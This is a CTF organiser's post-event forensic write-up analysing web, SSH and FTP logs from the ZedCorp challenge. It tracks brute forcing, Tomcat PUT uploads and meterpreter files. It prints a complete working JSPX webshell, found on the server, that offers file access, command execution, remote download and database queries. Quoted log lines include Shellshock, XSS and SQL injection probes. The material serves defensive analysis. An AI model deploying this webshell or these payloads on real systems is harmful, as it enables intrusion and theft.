+++
categories = ["Articles", "CERT", "CTF", "Hacklab-ESGI-CTF-2019"]
date = "2019-04-14"
title = "Post attack analyses ZedCorp Challenge - My name is Rookie"
thumbnail = "/img/hacklab-esgi-2019/logo.png"
nopaging = "true"
+++

The ZedCorp challenge alias "My name is Rookie" was a realistic challenge proposed at Hacklab ESGI CTF 2019. ZedCorp is a small startup who work in computer science and particulary in development. The goal was to recover confidential files owned by the CEO.

For this recap, I want to do some analyses on my challenge to know how challengers proceed to solve it. There is some fun facts :D
You can read [writeups here](/writeups/hacklab-esgi-2019/zedcorp/) to understand the context :

## Dev server

First, let's analyse the first server : `dev-server.zedcorp`

### Number of players

The first question is : `How many differents ip played on this challenge ?`

```bash
root@dev-server:~ $ cat full-access.log | awk '{print $1 }' | sort | uniq | wc -l
132
```

The command returned **132 unique ip**. Pretty good :)

### Players OS

And what was the os of challengers ?

```bash
root@dev-server:~ $ awk -F\" '{print $6}' full-access.log | sort | uniq -c | sort -nr | head -45
 189501 Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
  29151 Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1468.0 Safari/537.36
  17033 Wfuzz/2.3.4
  16132 Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
   5257 Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
   4615 gobuster 2.0.1
   4392 () { :; }; echo Nikto-Added-CVE-2014-6271: true;echo;echo;

    [...]

   2397 Mozilla/5.0 (X11; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
   1633 -
   1058 Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000964)
   
    [...]

    722 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
    
    [...]
    
    252 Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
    
    [...]
    
    206 curl/7.64.1
    201 Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
    
    [...]
    
    143 python-requests/2.19.1
    
    [...]

    102 MozilSakiiR<script>alert(1);</script>la/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0
```

Windows is the most used OS, followed by Linux and MacOs.

I'm really surprised to only see Wfuzz web bruteforcer in 3rd place (and not in 1st place). Like you see, the apps was targeted with tools like Wfuzz, gobuster, Nikto. But we have also nmap (why ?), curl and python. 

And for the fun, the last line is the personal user-agent of SakiiR, ctf player at Hexpresso :D (on mac os :o)

### Url most requested

And what was the url most requested ?

```bash
root@dev-server:~ $  awk -F\" '{print $2}' full-access.log | sort | uniq -c | sort -nr | head -10
  14136 POST /login.php HTTP/1.1
   4368 POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
   2548 OPTIONS * HTTP/1.0
   1421 GET / HTTP/1.1
    999 GET /index.php HTTP/1.1
    890 POST / HTTP/1.1
    732 POST /index.php HTTP/1.1
    674 GET /assets/css/main.css HTTP/1.1
    555 GET /assets/css/font-awesome.min.css HTTP/1.1
    550 GET /assets/js/jquery.scrolly.min.js HTTP/1.1
```

Who 14 000 on /login.php. Challengers love bruteforce :D

And also 3 500 requests with Th1b4ud as username

```bash
root@dev-server:~ $ cat full-access-details.log  | grep "username=Th1b4ud" | wc -l
3518
```

### Web bruteforce ?

What about the most tested password couple ?

```bash
root@dev-server:~ $ cat full-access-details.log  | grep "username=" | sort | uniq -c | sort -nr | head -n 10
    123 username=admin&password=pxrAW7a4HNMBw86bc
     36 username=admin&password=admin
     32 username=admin&password=password
     27 username=test&password=test
     26 username=admin&password=123456
     20 username=admin&password=test' OR 1=1
     19 username=Th1b4ud&password=test
     17 username=admin&password=12345
     14 username=Th1b4ud&password=password
     14 username=rookie&password=password
```

`admin:admin` of course followed by some trivial passwords.

### First ssh connexion

The first session with test user was opened at `09:06pm`

```
root@dev-server:~ $ strings full-auth.log | grep "session opened for user test" | head
Apr  5 21:06:15 dev-server sshd[2222]: pam_unix(sshd:session): session opened for user test by (uid=0)
Apr  5 21:06:16 dev-server systemd: pam_unix(systemd-user:session): session opened for user test by (uid=0)
Apr  5 21:06:42 dev-server sshd[2242]: pam_unix(sshd:session): session opened for user test by (uid=0)
```

### Number of SSH connection

Next question is : `How many connections as test user have been done during the ctf ?`
The ctf start at 08:00 PM

In all the section of this report, logs file are already truncated under 08:00pm and 06:00am.

```bash
root@dev-server:~ $ strings full-auth.log | grep "session opened for user test" | wc -l
515
```

In total, there were 515 connections done on dev-server as user `test`. It's pretty much :o

## Project server

Project server is the second server to exploit. It exposes a vulnerable Tomcat Webserver. Challengers had to exploit it to obtain a RCE and grab some credentials to exploit the third server : admin server.

### First access

First question is : `When did the first challenger discovered the internal network ?`

```bash
root@project-server:~ $ cat full-access.log | grep "05/Apr/2019"
[...]
10.0.0.1 - - [05/Apr/2019:21:48:55 +0200] "GET / HTTP/1.1" 200 4849
10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] "GET / HTTP/1.1" 200 4849
10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] "GET /robots.txt HTTP/1.1" 404 982
10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] "GET /kanban.css HTTP/1.1" 200 6284
10.0.0.1 - - [05/Apr/2019:21:49:06 +0200] "GET /kanban.js HTTP/1.1" 200 18191
```

Answer is in the logs : at 9:48pm, 1h48 after the start of the ctf

### First exploit and RCE

Second question is : `When was the first exploitation ?`

The first successfully PUT request was done at **22:05:06** with the file **test.html** with the content `test/test`
The first JSP executable file was put at **22:08:58** with the file **awdjgiuiqwdqwd.html.jsp** (.JSP extension is not execute by Tomcat)

```bash
root@project-server:~ $ cat full-access.log | grep "PUT" | grep "201 -"
10.0.0.1 - - [05/Apr/2019:22:04:25 +0200] "PUT /robots.txt HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:05:06 +0200] "PUT /test.html HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:07:32 +0200] "PUT /awdjgiuiqwdqwd.html HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:07:55 +0200] "PUT /awdjgiuiqwdqwd.html.JSP HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:08:20 +0200] "PUT /awdjgiuiqwdqwd.php HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:08:58 +0200] "PUT /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:18:05 +0200] "PUT /awdjgiuiqwdqwd.html.jsp%20 HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:20:47 +0200] "PUT /awdjgiuiqwdqwd.jsp%20 HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:21:33 +0200] "PUT /awdjgiuiqwdqwd.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] "PUT /IXXfDQcwzR.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] "PUT /jlfJTuKKrV.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:27:12 +0200] "PUT /nikto-test-xsK98kYM.html HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:27:34 +0200] "PUT /toto.jsp/ HTTP/1.1" 201 -
```

`awdjgiuiqwdqwd.html.jsp` was the first file to do a RCE on project-server at **22:15:14**

```bash
root@project-server:~ $ cat full-access.log | grep "awdjgiuiqwdqwd" | grep "GET" | head -n 30
10.0.0.1 - - [05/Apr/2019:22:06:29 +0200] "GET /awdjgiuiqwdqwd.jsp HTTP/1.1" 404 998
10.0.0.1 - - [05/Apr/2019:22:06:49 +0200] "GET /awdjgiuiqwdqwd.jsp HTTP/1.1" 404 998
10.0.0.1 - - [05/Apr/2019:22:07:02 +0200] "GET /awdjgiuiqwdqwd.jsp HTTP/1.1" 404 998
[...]
10.0.0.1 - - [05/Apr/2019:22:09:06 +0200] "GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:09:23 +0200] "GET /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1" 404 1010
10.0.0.1 - - [05/Apr/2019:22:09:25 +0200] "GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1" 500 3396
[... Too many 500 sorry ... :(]
10.0.0.1 - - [05/Apr/2019:22:15:11 +0200] "GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:15:14 +0200] "GET /awdjgiuiqwdqwd.html.jsp HTTP/1.1" 200 4
[...]
10.0.0.1 - - [05/Apr/2019:22:23:44 +0200] "GET /awdjgiuiqwdqwd.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:23:51 +0200] "GET /awdjgiuiqwdqwd.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:23:52 +0200] "GET /awdjgiuiqwdqwd.jsp HTTP/1.1" 200 -
```

Fun fact ! The challenger used two files to exploit the vulnerability : `awdjgiuiqwdqwd.html.jsp` and `awdjgiuiqwdqwd.jsp`
He didn't use classic webshell, but, maybe, a home made script to be more discreet. He (maybe) prefered to write his command in a file, put it on the tomcat and execute it. And do it again for an other command.


```bash
root@project-server:~ $ cat full-access.log | grep "awdjgiuiqwdqwd" | grep "PUT" | wc -l
184
root@project-server:~ $ cat full-access.log | grep "awdjgiuiqwdqwd" | grep "GET" | wc -l
335
root@project-server:~ $ cat full-access.log | grep "awdjgiuiqwdqwd.jsp" | grep "GET" | wc -l
78
root@project-server:~ $ cat full-access.log | grep "awdjgiuiqwdqwd.html.jsp" | grep "GET" | wc -l
63
```

### First meterpreter

Metasploit was used during the challenge. You can easily detect files generated by msf with their default name : **<10 random letters>.jsp**
The first meterpreter was uploaded at **22:23:24** but not succesfuly executed. The next one was successfuly executed at **22:46:20** with name of **jlfJTuKKrV.jsp**

```bash
root@project-server:~ $ cat full-access.log | grep "IXXfDQcwzR"
10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] "PUT /IXXfDQcwzR.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] "GET /IXXfDQcwzR.jsp HTTP/1.1" 500 3396

root@project-server:~ $ cat full-access.log | grep "jlfJTuKKrV"
10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] "PUT /jlfJTuKKrV.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] "GET /jlfJTuKKrV.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:46:20 +0200] "GET /jlfJTuKKrV.jsp HTTP/1.1" 200 6
```

### Number of meterpreters

So how many meterpreter was put on the server ?

We can can check the access log to count how many meterpreter was uploaded with :

- Filter on PUT request
- Filter on 201 request (creation code)
- Regex on meterpreter format

``` bash
root@project-server:~# cat full-access.log | grep "PUT" | grep "201 -" | grep -E "/[a-zA-Z]{10}.jsp" | cat
10.0.0.1 - - [05/Apr/2019:22:23:24 +0200] "PUT /IXXfDQcwzR.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:23:47 +0200] "PUT /jlfJTuKKrV.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [06/Apr/2019:00:08:03 +0200] "PUT /JlPVVbUpeX.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [06/Apr/2019:00:08:18 +0200] "PUT /VElkKxNlxi.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [06/Apr/2019:00:09:18 +0200] "PUT /ANTxWRVVzk.jsp/ HTTP/1.1" 201 -
[...]

root@project-server:~# cat full-access.log | grep "PUT" | grep "201 -" | grep -E "/[a-zA-Z]{10}.jsp" | wc -l
34
```

So access log recorded **34 meterpreters**
Let's check if they are here !

Go to webserver root, filter by size and apply meterpreter format regex.

```bash
root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E " [a-zA-Z]{10}.jsp"
-rw-rw---- 1 tomcat tomcat  1593 avril  6 00:34 cFAepKMVUT.jsp
-rw-rw---- 1 tomcat tomcat  1593 avril  6 00:35 GGfJjPwckZ.jsp
[...]
-rw-rw---- 1 tomcat tomcat  1494 avril  6 00:25 JvdgETUaAe.jsp
-rw-rw---- 1 tomcat tomcat  1494 avril  6 00:22 XhZxuamJBV.jsp
-rw-rw---- 1 tomcat tomcat    31 avril  6 00:24 BpngppVGgi.jsp
[...]
-rw-rw---- 1 tomcat tomcat    31 avril  6 00:18 ZgEspEANsz.jsp
```

And count lines.

```
root@project-server:/opt/tomcat/webapps/ROOT# ls -Sal | grep -E " [a-zA-Z]{10}.jsp" | wc -l
34
```

34 ! Perfect. Challenger don't take time to delete their trace :o

You can also see, there is two size of meterpreter : `31 bytes` and `1500 bytes`. The first type of file is the payload of the msf `check` command (content : `<% out.println("MXvshOoWGH");%>`)

### First webshell

And when was uploaded the first webshell ?

```bash
root@project-server:~ $ cat full-access.log | grep ".jsp?" | head
10.0.0.1 - - [05/Apr/2019:22:29:15 +0200] "GET /toto.jsp?cmd=whoami HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:29:17 +0200] "GET /toto.jsp?cmd=whoami HTTP/1.1" 200 178
```

`toto.js` was the first webshell and was created at `22:29:17`.

```
root@project-server:~ $ cat full-access.log | grep "toto.jsp"
10.0.0.1 - - [05/Apr/2019:22:27:34 +0200] "PUT /toto.jsp/ HTTP/1.1" 201 -
10.0.0.1 - - [05/Apr/2019:22:27:40 +0200] "GET /toto.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:27:50 +0200] "GET /toto.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:27:57 +0200] "GET /toto.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:28:22 +0200] "PUT /toto.jsp/ HTTP/1.1" 204 -
10.0.0.1 - - [05/Apr/2019:22:28:25 +0200] "GET /toto.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:28:27 +0200] "GET /toto.jsp HTTP/1.1" 200 13
10.0.0.1 - - [05/Apr/2019:22:29:02 +0200] "PUT /toto.jsp/ HTTP/1.1" 204 -
10.0.0.1 - - [05/Apr/2019:22:29:08 +0200] "GET /toto.jsp HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:29:09 +0200] "GET /toto.jsp HTTP/1.1" 200 151
10.0.0.1 - - [05/Apr/2019:22:29:15 +0200] "GET /toto.jsp?cmd=whoami HTTP/1.1" 500 3396
10.0.0.1 - - [05/Apr/2019:22:29:17 +0200] "GET /toto.jsp?cmd=whoami HTTP/1.1" 200 178
```

### Number of backdoor

How many backdoors was put on the server during the challenge ?

```
root@project-server:~# cat full-access.log | grep "PUT" | grep "201 -" | grep "jsp" | wc -l
124
```

```
root@project-server:/opt/tomcat/webapps/ROOT# ls -al | grep "jsp" | wc -l
114
```

Strange. Why don't we have the same number ?

Let's sort the list and get a diff.

```
root@project-server:~# diff recorded-sort.txt stored-sort.txt 
21c21
< awdjgiuiqwdqwd.html.jsp%20
---
> awdjgiuiqwdqwd.html.jsp 
23c23
< awdjgiuiqwdqwd.jsp%20
---
> awdjgiuiqwdqwd.jsp 
57,66d56
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
< mybrandnewshell.jsp
```

Oh ! 10 duplication of a file. We can remove them. So we have the same number : `114 backdoors`
Challengers didn't delete their traces. Not really discreet :)

### Interesting backdoor

There is an interesting backdoor. I will study it later.

```
root@project-server:/opt/tomcat/webapps/ROOT# cat shatt.jspx

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="1.2"><jsp:directive.page contentType="text/html" pageEncoding="UTF-8" /><jsp:directive.page import="java.io.*"/><jsp:directive.page import="java.util.*"/><jsp:directive.page import="java.net.*"/><jsp:directive.page import="java.sql.*"/><jsp:directive.page import="java.text.*"/><jsp:declaration>String Pwd="023";String cs="UTF-8";String EC(String s)throws Exception{return new String(s.getBytes("ISO-8859-1"),cs);}Connection GC(String s)throws Exception{String[] x=s.trim().split("\r\n");Class.forName(x[0].trim());if(x[1].indexOf("jdbc:oracle")!=-1){return DriverManager.getConnection(x[1].trim()+":"+x[4],x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);}else{Connection c=DriverManager.getConnection(x[1].trim(),x[2].equalsIgnoreCase("[/null]")?"":x[2],x[3].equalsIgnoreCase("[/null]")?"":x[3]);if(x.length>4){c.setCatalog(x[4]);}return c;}}void AA(StringBuffer sb)throws Exception{File r[]=File.listRoots();for(int i=0;i&lt;r.length;i++){sb.append(r[i].toString().substring(0,2));}}void BB(String s,StringBuffer sb)throws Exception{File oF=new File(s),l[]=oF.listFiles();String sT,sQ,sF="";java.util.Date dt;SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");for(int i=0; i&lt;l.length; i++){dt=new java.util.Date(l[i].lastModified());sT=fm.format(dt);sQ=l[i].canRead()?"R":"";sQ +=l[i].canWrite()?" W":"";if(l[i].isDirectory()){sb.append(l[i].getName()+"/\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n");}else{sF+=l[i].getName()+"\t"+sT+"\t"+l[i].length()+"\t"+sQ+"\n";}}sb.append(sF);}void EE(String s)throws Exception{File f=new File(s);if(f.isDirectory()){File x[]=f.listFiles();for(int k=0; k &lt; x.length; k++){if(!x[k].delete()){EE(x[k].getPath());}}}f.delete();}void FF(String s,HttpServletResponse r)throws Exception{int n;byte[] b=new byte[512];r.reset();ServletOutputStream os=r.getOutputStream();BufferedInputStream is=new BufferedInputStream(new FileInputStream(s));os.write(("->"+"|").getBytes(),0,3);while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}os.write(("|"+"&lt;-").getBytes(),0,3);os.close();is.close();}void GG(String s,String d)throws Exception{String h="0123456789ABCDEF";File f=new File(s);f.createNewFile();FileOutputStream os=new FileOutputStream(f);for(int i=0; i&lt;d.length();i+=2){os.write((h.indexOf(d.charAt(i)) &lt;&lt; 4 | h.indexOf(d.charAt(i+1))));}os.close();}void HH(String s,String d)throws Exception{File sf=new File(s),df=new File(d);if(sf.isDirectory()){if(!df.exists()){df.mkdir();}File z[]=sf.listFiles();for(int j=0; j&lt;z.length; j++){HH(s+"/"+z[j].getName(),d+"/"+z[j].getName());}}else{FileInputStream is=new FileInputStream(sf);FileOutputStream os=new FileOutputStream(df);int n;byte[] b=new byte[512];while((n=is.read(b,0,512))!=-1){os.write(b,0,n);}is.close();os.close();}}void II(String s,String d)throws Exception{File sf=new File(s),df=new File(d);sf.renameTo(df);}void JJ(String s)throws Exception{File f=new File(s);f.mkdir();}void KK(String s,String t)throws Exception{File f=new File(s);SimpleDateFormat fm=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");java.util.Date dt=fm.parse(t);f.setLastModified(dt.getTime());}void LL(String s,String d)throws Exception{URL u=new URL(s);int n=0;FileOutputStream os=new FileOutputStream(d);HttpURLConnection h=(HttpURLConnection) u.openConnection();InputStream is=h.getInputStream();byte[] b=new byte[512];while((n=is.read(b))!=-1){os.write(b,0,n);}os.close();is.close();h.disconnect();}void MM(InputStream is,StringBuffer sb)throws Exception{String l;BufferedReader br=new BufferedReader(new InputStreamReader(is));while((l=br.readLine())!=null){sb.append(l+"\r\n");}}void NN(String s,StringBuffer sb)throws Exception{Connection c=GC(s);ResultSet r=s.indexOf("jdbc:oracle")!=-1?c.getMetaData().getSchemas():c.getMetaData().getCatalogs();while(r.next()){sb.append(r.getString(1)+"\t");}r.close();c.close();}void OO(String s,StringBuffer sb)throws Exception{Connection c=GC(s);String[] x=s.trim().split("\r\n");ResultSet r=c.getMetaData().getTables(null,s.indexOf("jdbc:oracle")!=-1?x.length>5?x[5]:x[4]:null,"%",new String[]{"TABLE"});while(r.next()){sb.append(r.getString("TABLE_NAME")+"\t");}r.close();c.close();}void PP(String s,StringBuffer sb)throws Exception{String[] x=s.trim().split("\r\n");Connection c=GC(s);Statement m=c.createStatement(1005,1007);ResultSet r=m.executeQuery("select * from "+x[x.length-1]);ResultSetMetaData d=r.getMetaData();for(int i=1;i&lt;=d.getColumnCount();i++){sb.append(d.getColumnName(i)+" ("+d.getColumnTypeName(i)+")\t");}r.close();m.close();c.close();}void QQ(String cs,String s,String q,StringBuffer sb,String p)throws Exception{Connection c=GC(s);Statement m=c.createStatement(1005,1008);BufferedWriter bw=null;try{ResultSet r=m.executeQuery(q.indexOf("--f:")!=-1?q.substring(0,q.indexOf("--f:")):q);ResultSetMetaData d=r.getMetaData();int n=d.getColumnCount();for(int i=1; i &lt;=n; i++){sb.append(d.getColumnName(i)+"\t|\t");}sb.append("\r\n");if(q.indexOf("--f:")!=-1){File file=new File(p);if(q.indexOf("-to:")==-1){file.mkdir();}bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(q.indexOf("-to:")!=-1?p.trim():p+q.substring(q.indexOf("--f:")+4,q.length()).trim()),true),cs));}while(r.next()){for(int i=1; i&lt;=n;i++){if(q.indexOf("--f:")!=-1){bw.write(r.getObject(i)+""+"\t");bw.flush();}else{sb.append(r.getObject(i)+""+"\t|\t");}}if(bw!=null){bw.newLine();}sb.append("\r\n");}r.close();if(bw!=null){bw.close();}}catch(Exception e){sb.append("Result\t|\t\r\n");try{m.executeUpdate(q);sb.append("Execute Successfully!\t|\t\r\n");}catch(Exception ee){sb.append(ee.toString()+"\t|\t\r\n");}}m.close();c.close();}</jsp:declaration><jsp:scriptlet>cs=request.getParameter("z0")!=null?request.getParameter("z0")+"":cs;response.setContentType("text/html");response.setCharacterEncoding(cs);StringBuffer sb=new StringBuffer("");try{String Z=EC(request.getParameter(Pwd)+"");String z1=EC(request.getParameter("z1")+"");String z2=EC(request.getParameter("z2")+"");sb.append("->"+"|");String s=request.getSession().getServletContext().getRealPath("/");if(Z.equals("A")){sb.append(s+"\t");if(!s.substring(0,1).equals("/")){AA(sb);}}else if(Z.equals("B")){BB(z1,sb);}else if(Z.equals("C")){String l="";BufferedReader br=new BufferedReader(new InputStreamReader(new FileInputStream(new File(z1))));while((l=br.readLine())!=null){sb.append(l+"\r\n");}br.close();}else if(Z.equals("D")){BufferedWriter bw=new BufferedWriter(new OutputStreamWriter(new FileOutputStream(new File(z1))));bw.write(z2);bw.close();sb.append("1");}else if(Z.equals("E")){EE(z1);sb.append("1");}else if(Z.equals("F")){FF(z1,response);}else if(Z.equals("G")){GG(z1,z2);sb.append("1");}else if(Z.equals("H")){HH(z1,z2);sb.append("1");}else if(Z.equals("I")){II(z1,z2);sb.append("1");}else if(Z.equals("J")){JJ(z1);sb.append("1");}else if(Z.equals("K")){KK(z1,z2);sb.append("1");}else if(Z.equals("L")){LL(z1,z2);sb.append("1");}else if(Z.equals("M")){String[] c={z1.substring(2),z1.substring(0,2),z2};Process p=Runtime.getRuntime().exec(c);MM(p.getInputStream(),sb);MM(p.getErrorStream(),sb);}else if(Z.equals("N")){NN(z1,sb);}else if(Z.equals("O")){OO(z1,sb);}else if(Z.equals("P")){PP(z1,sb);}else if(Z.equals("Q")){QQ(cs,z1,z2,sb,z2.indexOf("-to:")!=-1?z2.substring(z2.indexOf("-to:")+4,z2.length()):s.replaceAll("\\\\","/")+"images/");}}catch(Exception e){sb.append("ERROR"+":// "+e.toString());}sb.append("|"+"&lt;-");out.print(sb.toString());</jsp:scriptlet></jsp:root>
```

No hint in access log

```
root@project-server:~# cat full-access.log | grep "shatt.jspx"

10.0.0.1 - - [06/Apr/2019:02:36:09 +0200] "PUT /shatt.jspx/ HTTP/1.1" 201 -
10.0.0.1 - - [06/Apr/2019:02:36:13 +0200] "GET /shatt.jspx HTTP/1.1" 500 5403
10.0.0.1 - - [06/Apr/2019:02:38:34 +0200] "PUT /shatt.jspx/ HTTP/1.1" 204 -
```

## Admin server

### First access

When did the first challenger reach the internal network ? Remember, access log on `project-server` indicates that first request was done at `9:48pm`. But on `admin-server` the first request was done at `9:16pm` (maybe because nginx ran on port 80)

```
root@admin-server:~# head full-access.log 
10.0.0.1 - - [05/Apr/2019:21:16:23 +0200] "GET / HTTP/1.1" 401 188 "-" "curl/7.64.0"
10.0.0.1 - - [05/Apr/2019:21:16:34 +0200] "GET / HTTP/1.1" 401 188 "-" "curl/7.64.0"
10.0.0.1 - - [05/Apr/2019:21:16:43 +0200] "GET / HTTP/1.1" 401 188 "-" "curl/7.64.0"
```

### First ftp connexion

The first valid login on the ftp service was done at `10:47pm`.

```
root@admin-server:~# cat full-vstfpd.log | grep "LOGIN"
Fri Apr  5 22:02:02 2019 [pid 1476] [backup] FAIL LOGIN: Client "::ffff:10.0.0.1"
Fri Apr  5 22:02:19 2019 [pid 1480] [backup] FAIL LOGIN: Client "::ffff:10.0.0.1"
Fri Apr  5 22:02:27 2019 [pid 1480] [backup] FAIL LOGIN: Client "::ffff:10.0.0.1"
Fri Apr  5 22:02:41 2019 [pid 1480] [backup] FAIL LOGIN: Client "::ffff:10.0.0.1"
Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client "::ffff:10.0.0.1"
```

### Total ftp connexion

There was **42 connexions** established on admin-server ftp server during the ctf.

```
root@admin-server:~# cat full-vstfpd.log | grep "OK LOGIN" | wc -l
42
```

### First creds download

And first downloading of encrypted credentials was done at `10:48pm`

```
root@admin-server:~# cat full-vstfpd.log | grep "OK"
Fri Apr  5 22:47:04 2019 [pid 1656] [backup] OK LOGIN: Client "::ffff:10.0.0.1"
Fri Apr  5 22:47:23 2019 [pid 1659] [backup] OK LOGIN: Client "::ffff:10.0.0.1"
Fri Apr  5 22:47:38 2019 [pid 1661] [backup] OK DOWNLOAD: Client "::ffff:10.0.0.1", "/TODO.txt", 80 bytes, 1.33Kbyte/sec
Fri Apr  5 22:47:52 2019 [pid 1661] [backup] OK DOWNLOAD: Client "::ffff:10.0.0.1", "/kanban.png", 130540 bytes, 2123.12Kbyte/sec
Fri Apr  5 22:47:54 2019 [pid 1661] [backup] OK DOWNLOAD: Client "::ffff:10.0.0.1", "/kanban2.png", 35776 bytes, 3169.80Kbyte/sec
Fri Apr  5 22:48:15 2019 [pid 1661] [backup] OK DOWNLOAD: Client "::ffff:10.0.0.1", "/credentials.tar.gz", 304 bytes, 5.21Kbyte/sec
```

### Number of credentials download

Encrypted credentials have been only downloaded **20 times**

```
root@admin-server:~# cat full-vstfpd.log | grep "/credentials.tar.gz" | wc -l
20
```

### First reading of confidential documents

The first challenger stole confidential documents at `11:05pm`. He also validated the challenge in same time. 

```
root@admin-server:~# cat full-access.log | grep -E "*.pdf" | grep " 200 "
10.0.0.1 - admin [05/Apr/2019:23:05:25 +0200] "GET /cv1.pdf HTTP/1.1" 200 46462 "http://10.0.0.3/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.0.0.1 - admin [05/Apr/2019:23:05:26 +0200] "GET /cv2.pdf HTTP/1.1" 200 250556 "http://10.0.0.3/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1" 200 14506 "http://10.0.0.3/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
```

### Challenge validations

The challenge was validated by 6 teams at :

- 11:05pm
- 11:16pm
- 01:40am
- 03:14am
- 03:30am
- 04:40am

```
root@admin-server:~# cat full-access.log | grep "273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74" | grep " 200 "

10.0.0.1 - admin [05/Apr/2019:23:05:40 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1" 200 14506 "http://10.0.0.3/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.0.0.1 - admin [05/Apr/2019:23:16:12 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1" 200 14506 "-" "curl/7.64.0"
10.0.0.1 - admin [06/Apr/2019:01:40:06 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/trybu.pdf HTTP/1.1" 200 14285 "http://10.0.0.3/index.php" "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0"
10.0.0.1 - admin [06/Apr/2019:03:14:40 +0200] "GET /273181bb39e87be4fe872ae250ec428ff55f0e0ef937999114248d1dfd4a6f74/rizone.pdf HTTP/1.1" 200 14506 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0"
